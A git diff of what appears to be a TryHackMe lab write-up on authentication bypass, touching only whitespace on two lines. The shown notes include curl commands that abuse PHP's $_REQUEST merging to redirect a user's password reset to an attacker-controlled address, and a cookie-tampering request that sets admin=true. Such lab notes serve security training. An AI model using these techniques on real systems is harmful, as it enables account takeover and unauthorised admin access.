@@ -86,9 +86,9 @@ In HTML source we can find:
 
 **Logic Flaw**  
 Playing with the fact  PHP $_REQUEST variable is an array that contains data received from the query string _AND_ POST data. We do this 2 queries:  
-- `curl 'http://10.10.164.175/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'`
+- `curl 'http://10.10.164.175/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'`  
 Create an account and then:    
-- `curl 'http://10.10.164.175/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'`
+- `curl 'http://10.10.164.175/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'`  
 
 **Cookie Tampering**  
 - Set the cookie `curl -H "Cookie: logged_in=true; admin=true" http://10.10.164.175/cookie-test`
